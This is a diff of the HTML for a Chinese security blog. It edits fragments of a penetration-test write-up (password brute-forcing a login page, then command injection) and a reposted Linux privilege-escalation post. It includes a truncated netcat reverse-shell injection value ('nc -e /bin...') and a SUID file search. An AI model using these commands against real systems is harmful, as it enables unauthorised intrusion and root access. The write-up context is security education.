@@ -548,10 +548,11 @@
 
 访问web页面，发现是个登录框尝试万能密码未果后进行爆破
 
-一开始用top3000没跑出来，上top1000 跑出用户名密码是admin/happy
+一开始用top3000没跑出来，上top10000 跑出用户名密码是admin/happy
+
 登陆后发现可执行系统命令
 抓包，修改命令可执行成功
-执行反弹shell命令,成功上线1radio=nc+-e+/bin/b
+执行反弹shell命令,成功上线1radio=nc+-e+/bin
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -874,12 +875,10 @@
         
           
           转载自 https://www.cnblogs.com/zaqzzz/p/12075132.html 
-目录
+1.suid提权1运行某些程序时暂时获得root的权限，例如ping(socket需要root才能运行)
 
-1.suid提权
-2.rbash绕过
-3.git提权
-4.Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG
+搜索符合条件的可以用来提权的：
+1234# 三种都可以find / -perm -u=s
           ...
           <!--noindex-->
           <div class="post-button text-center">
